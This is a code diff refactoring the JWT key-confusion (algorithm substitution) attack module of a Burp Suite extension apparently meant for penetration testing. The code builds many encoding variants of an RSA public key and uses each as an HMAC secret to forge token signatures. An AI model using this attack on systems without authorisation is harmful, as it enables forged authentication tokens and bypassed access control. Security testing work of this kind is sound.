@@ -24,10 +24,7 @@ import burp.IHttpRequestResponse;
 import burp.IRequestInfo;
 import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
 import eu.dety.burp.joseph.attacks.IAttackInfo;
-import eu.dety.burp.joseph.utilities.Converter;
-import eu.dety.burp.joseph.utilities.Decoder;
-import eu.dety.burp.joseph.utilities.JoseParameter;
-import eu.dety.burp.joseph.utilities.Logger;
+import eu.dety.burp.joseph.utilities.*;
 import org.apache.commons.codec.binary.Base64;
 import org.json.simple.parser.JSONParser;
 
@@ -81,30 +78,23 @@ public class KeyConfusionInfo implements IAttackInfo {
     private int amountRequests = 0;
 
     // Types of payload variation
-    private enum payloadType {
+    public enum payloadType {
         // Derived from PEM input
-        ORIGINAL,
-        ORIGINAL_WITHOUT_HEADER_FOOTER,
-        ORIGINAL_WITHOUT_LINE_FEEDS,
-        ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS,
-        ORIGINAL_TRIMMED,
-        ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED,
-        ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED,
-        ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED,
-        ORIGINAL_TRIMMED_WITH_ENDING_LINEFEED,
-        ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED_WITH_ENDING_LINEFEED,
-        ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED,
-        ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED,
+        ORIG,
+        ORIG_NO_HEAD_FOOT,
+        ORIG_NO_LF,
+        ORIG_NO_HEAD_FOOT_LF,
+        PKCS1,
+        PKCS1_NO_HEAD_FOOT,
+        PKCS1_NO_LF,
+        PKCS1_NO_HEAD_FOOT_LF,
 
         // Derived from JWK input
-        PKCS1,
-        PKCS1_WITH_LINEFEEDS,
-        PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER,
-        PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED,
         PKCS8,
-        PKCS8_WITH_LINEFEEDS,
-        PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER,
-        PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED,
+        PKCS8_WITH_HEAD_FOOT,
+        PKCS8_WITH_LF,
+        PKCS8_WITH_LF_HEAD_FOOT,
+        PKCS8_WITH_LF_HEAD_FOOT_END_LF,
     }
 
     // Hashmap of available payloads with a verbose name (including the payloadType)
@@ -158,20 +148,17 @@ public class KeyConfusionInfo implements IAttackInfo {
                         // PKCS#8 / X.509
                         publicKeyVariations.put(payloadType.PKCS8, transformKeyByPayload(payloadType.PKCS8, publicKey));
 
-                        // PKCS#1, easy but hacky transformation
-                        publicKeyVariations.put(payloadType.PKCS1, transformKeyByPayload(payloadType.PKCS1, publicKey));
+                        // With header/footer
+                        publicKeyVariations.put(payloadType.PKCS8_WITH_HEAD_FOOT, transformKeyByPayload(payloadType.PKCS8_WITH_HEAD_FOOT, publicKey));
 
                         // With line feeds
-                        publicKeyVariations.put(payloadType.PKCS8_WITH_LINEFEEDS, transformKeyByPayload(payloadType.PKCS8_WITH_LINEFEEDS, publicKey));
-                        publicKeyVariations.put(payloadType.PKCS1_WITH_LINEFEEDS, transformKeyByPayload(payloadType.PKCS1_WITH_LINEFEEDS, publicKey));
+                        publicKeyVariations.put(payloadType.PKCS8_WITH_LF, transformKeyByPayload(payloadType.PKCS8_WITH_LF, publicKey));
 
                         // With line feeds and header/footer
-                        publicKeyVariations.put(payloadType.PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER, transformKeyByPayload(payloadType.PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER, publicKey));
-                        publicKeyVariations.put(payloadType.PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER, transformKeyByPayload(payloadType.PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER, publicKey));
+                        publicKeyVariations.put(payloadType.PKCS8_WITH_LF_HEAD_FOOT, transformKeyByPayload(payloadType.PKCS8_WITH_LF_HEAD_FOOT, publicKey));
 
                         // With line feeds and header/footer and additional line feed at end
-                        publicKeyVariations.put(payloadType.PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED, transformKeyByPayload(payloadType.PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED, publicKey));
-                        publicKeyVariations.put(payloadType.PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED, transformKeyByPayload(payloadType.PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED, publicKey));
+                        publicKeyVariations.put(payloadType.PKCS8_WITH_LF_HEAD_FOOT_END_LF, transformKeyByPayload(payloadType.PKCS8_WITH_LF_HEAD_FOOT_END_LF, publicKey));
                     }
 
                 } catch (Exception e) {
@@ -184,47 +171,38 @@ public class KeyConfusionInfo implements IAttackInfo {
                 loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);
 
                 // Simple check if String has valid format
-                if (!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MII")) {
+                if (!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MI")) {
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                 }
 
-                // No modification
-                publicKeyVariations.put(payloadType.ORIGINAL, publicKeyValue);
+                try {
+                    // No modification
+                    publicKeyVariations.put(payloadType.ORIG, publicKeyValue);
 
-                // Without header/footer
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER, publicKeyValue));
+                    // Without header/footer
+                    publicKeyVariations.put(payloadType.ORIG_NO_HEAD_FOOT, transformKeyByPayload(payloadType.ORIG_NO_HEAD_FOOT, publicKeyValue));
 
-                // Without line feeds/carriage returns
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS, publicKeyValue));
+                    // Without line feeds/carriage returns
+                    publicKeyVariations.put(payloadType.ORIG_NO_LF, transformKeyByPayload(payloadType.ORIG_NO_LF, publicKeyValue));
 
-                // Without header/footer and line feeds/carriage returns
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS, publicKeyValue));
+                    // Without header/footer and line feeds/carriage returns
+                    publicKeyVariations.put(payloadType.ORIG_NO_HEAD_FOOT_LF, transformKeyByPayload(payloadType.ORIG_NO_HEAD_FOOT_LF, publicKeyValue));
 
+                    // PKCS#1, easy but hacky transformation
+                    publicKeyVariations.put(payloadType.PKCS1, transformKeyByPayload(payloadType.PKCS1, publicKeyValue));
 
-                // Trimmed
-                publicKeyVariations.put(payloadType.ORIGINAL_TRIMMED, transformKeyByPayload(payloadType.ORIGINAL_TRIMMED, publicKeyValue));
+                    // PKCS#1 without header/footer
+                    publicKeyVariations.put(payloadType.PKCS1_NO_HEAD_FOOT, transformKeyByPayload(payloadType.PKCS1_NO_HEAD_FOOT, publicKeyValue));
 
-                // Without header/footer and trimmed
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED, publicKeyValue));
+                    // PKCS#1 without line feeds/carriage returns
+                    publicKeyVariations.put(payloadType.PKCS1_NO_LF, transformKeyByPayload(payloadType.PKCS1_NO_LF, publicKeyValue));
 
-                // Without line feeds/carriage returns and trimmed
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED, publicKeyValue));
+                    // PKCS#1 without header/footer and line feeds/carriage returns
+                    publicKeyVariations.put(payloadType.PKCS1_NO_HEAD_FOOT_LF, transformKeyByPayload(payloadType.PKCS1_NO_HEAD_FOOT_LF, publicKeyValue));
 
-                // Without header/footer and line feeds/carriage returns and trimmed
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED, publicKeyValue));
-
-
-                // Trimmed with line feed at end
-                publicKeyVariations.put(payloadType.ORIGINAL_TRIMMED_WITH_ENDING_LINEFEED, transformKeyByPayload(payloadType.ORIGINAL_TRIMMED_WITH_ENDING_LINEFEED, publicKeyValue));
-
-                // Without header/footer and trimmed with line feed at end
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED_WITH_ENDING_LINEFEED, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED_WITH_ENDING_LINEFEED, publicKeyValue));
-
-                // Without line feeds/carriage returns and trimmed with line feed at end
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED, publicKeyValue));
-
-                // Without header/footer and line feeds/carriage returns and trimmed with line feed at end
-                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED, transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED, publicKeyValue));
+                } catch (Exception e) {
+                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
+                }
 
                 break;
         }
@@ -251,7 +229,7 @@ public class KeyConfusionInfo implements IAttackInfo {
                     }
 
                     // Generate signature
-                    String newSignature = generateSignature(macAlg, helpers.stringToBytes(publicKey.getValue()), helpers.stringToBytes(Decoder.concatComponents(new String[]{encodedHeaderReplacedAlgorithm, components[1]})));
+                    String newSignature = Decoder.getEncoded(Crypto.generateMac(macAlg, helpers.stringToBytes(publicKey.getValue()), helpers.stringToBytes(Decoder.concatComponents(new String[]{encodedHeaderReplacedAlgorithm, components[1]}))));
 
                     // Build new JWT String and update parameter
                     String[] newComponents = {encodedHeaderReplacedAlgorithm, components[1], newSignature};
@@ -362,11 +340,18 @@ public class KeyConfusionInfo implements IAttackInfo {
                 loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);
 
                 // Simple check if String has valid format
-                if (!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MII")) {
+                if (!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MI")) {
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                 }
 
-                modifiedKey = transformKeyByPayload(payloadTypeId, publicKeyValue);
+                try {
+                    modifiedKey = transformKeyByPayload(payloadTypeId, publicKeyValue);
+
+                } catch (Exception e) {
+                    loggerInstance.log(getClass(), "Error in updateValuesByPayload (PEM):  " + e.getMessage(), Logger.LogLevel.ERROR);
+                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
+                }
+
         }
 
         Pattern jwtPattern = Pattern.compile("\"alg\":\"(.+?)\"", Pattern.CASE_INSENSITIVE);
@@ -392,7 +377,7 @@ public class KeyConfusionInfo implements IAttackInfo {
         HashMap<String, String> result = new HashMap<>();
         result.put("header", header);
         result.put("payload", payload);
-        result.put("signature", generateSignature(macAlg, helpers.stringToBytes(modifiedKey), helpers.stringToBytes(Decoder.concatComponents(new String[]{Decoder.base64UrlEncode(helpers.stringToBytes(header)), Decoder.base64UrlEncode(helpers.stringToBytes(payload))}))));
+        result.put("signature", Decoder.getEncoded(Crypto.generateMac(macAlg, helpers.stringToBytes(modifiedKey), helpers.stringToBytes(Decoder.concatComponents(new String[]{Decoder.base64UrlEncode(helpers.stringToBytes(header)), Decoder.base64UrlEncode(helpers.stringToBytes(payload))})))));
 
         if (publicKeyValue.isEmpty()) {
             return result;
@@ -401,69 +386,42 @@ public class KeyConfusionInfo implements IAttackInfo {
         return result;
     }
 
-    private String generateSignature(String algorithm, byte[] key, byte[] message) {
-        try {
-            Mac mac = Mac.getInstance(algorithm);
-            SecretKeySpec secret_key = new SecretKeySpec(key, algorithm);
-            mac.init(secret_key);
-
-            return Decoder.getEncoded(mac.doFinal(message));
-        } catch (Exception e) {
-            loggerInstance.log(getClass(), "Error during signature generation: " + e.getMessage(), Logger.LogLevel.ERROR);
-            return "ERROR";
-        }
-    }
-
-    // TODO: Write tests
-    private String transformKeyByPayload(Enum payloadTypeId, String key) {
+    public String transformKeyByPayload(Enum payloadTypeId, String key) {
         String modifiedKey;
 
         switch ((payloadType) payloadTypeId) {
-            case ORIGINAL_WITHOUT_HEADER_FOOTER:
-                modifiedKey = key.replace("-----BEGIN PUBLIC KEY-----\n", "").replace("-----END PUBLIC KEY-----", "").replace("-----BEGIN RSA PUBLIC KEY-----\n", "").replace("-----END RSA PUBLIC KEY-----", "");
+            case ORIG_NO_HEAD_FOOT:
+                modifiedKey = key.replace("-----BEGIN PUBLIC KEY-----\n", "")
+                                 .replaceAll("-----END PUBLIC KEY-----\\n?", "")
+                                 .replace("-----BEGIN RSA PUBLIC KEY-----\n", "")
+                                 .replaceAll("-----END RSA PUBLIC KEY-----\\n?", "");
                 break;
 
-            case ORIGINAL_WITHOUT_LINE_FEEDS:
+            case ORIG_NO_LF:
                 modifiedKey = key.replaceAll("\\r\\n|\\r|\\n", "");
                 break;
 
-            case ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER, key).replaceAll("\\r\\n|\\r|\\n", "");
+            case ORIG_NO_HEAD_FOOT_LF:
+                modifiedKey = transformKeyByPayload(payloadType.ORIG_NO_LF, transformKeyByPayload(payloadType.ORIG_NO_HEAD_FOOT, key));
                 break;
 
-            case ORIGINAL_TRIMMED:
-                modifiedKey = key.trim();
+            case PKCS1:
+                modifiedKey = key.substring(32);
                 break;
 
-            case ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER, key).trim();
+            case PKCS1_NO_HEAD_FOOT:
+                modifiedKey = transformKeyByPayload(payloadType.PKCS1, transformKeyByPayload(payloadType.ORIG_NO_HEAD_FOOT, key));
                 break;
 
-            case ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS, key).trim();
+            case PKCS1_NO_LF:
+                modifiedKey = transformKeyByPayload(payloadType.PKCS1, transformKeyByPayload(payloadType.ORIG_NO_LF, key));
                 break;
 
-            case ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS, key).trim();
+            case PKCS1_NO_HEAD_FOOT_LF:
+                modifiedKey = transformKeyByPayload(payloadType.PKCS1, transformKeyByPayload(payloadType.ORIG_NO_HEAD_FOOT_LF, key));
                 break;
 
-            case ORIGINAL_TRIMMED_WITH_ENDING_LINEFEED:
-                modifiedKey = key.trim() + "\n";
-                break;
-
-            case ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED_WITH_ENDING_LINEFEED:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED, key) + "\n";
-                break;
-
-            case ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED, key) + "\n";
-                break;
-
-            case ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED:
-                modifiedKey = transformKeyByPayload(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED, key) + "\n";
-                break;
-
-            case ORIGINAL:
+            case ORIG:
             default:
                 modifiedKey = key;
                 break;
@@ -473,37 +431,26 @@ public class KeyConfusionInfo implements IAttackInfo {
         return modifiedKey;
     }
 
-    private String transformKeyByPayload(Enum payloadTypeId, PublicKey key) throws UnsupportedEncodingException {
+    public String transformKeyByPayload(Enum payloadTypeId, PublicKey key) throws UnsupportedEncodingException {
         Base64 base64Pem = new Base64(64, "\n".getBytes("UTF-8"));
 
         String modifiedKey;
 
         switch ((payloadType) payloadTypeId) {
-            case PKCS1:
-                modifiedKey = Base64.encodeBase64String(Arrays.copyOfRange(key.getEncoded(), 24, key.getEncoded().length));
+
+            case PKCS8_WITH_HEAD_FOOT:
+                modifiedKey = "-----BEGIN PUBLIC KEY-----" + Base64.encodeBase64String(key.getEncoded()) + "-----END PUBLIC KEY-----";
                 break;
 
-            case PKCS1_WITH_LINEFEEDS:
-                modifiedKey = base64Pem.encodeToString(Arrays.copyOfRange(key.getEncoded(), 24, key.getEncoded().length));
-                break;
-
-            case PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER:
-                modifiedKey = "-----BEGIN RSA PUBLIC KEY-----\n" + base64Pem.encodeToString(Arrays.copyOfRange(key.getEncoded(), 24, key.getEncoded().length)) + "-----END RSA PUBLIC KEY-----";
-                break;
-
-            case PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED:
-                modifiedKey = "-----BEGIN RSA PUBLIC KEY-----\n" + base64Pem.encodeToString(Arrays.copyOfRange(key.getEncoded(), 24, key.getEncoded().length)) + "-----END RSA PUBLIC KEY-----\n";
-                break;
-
-            case PKCS8_WITH_LINEFEEDS:
+            case PKCS8_WITH_LF:
                 modifiedKey = base64Pem.encodeToString(key.getEncoded());
                 break;
 
-            case PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER:
+            case PKCS8_WITH_LF_HEAD_FOOT:
                 modifiedKey = "-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(key.getEncoded()) + "-----END PUBLIC KEY-----";
                 break;
 
-            case PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED:
+            case PKCS8_WITH_LF_HEAD_FOOT_END_LF:
                 modifiedKey = "-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(key.getEncoded()) + "-----END PUBLIC KEY-----\n";
                 break;
 
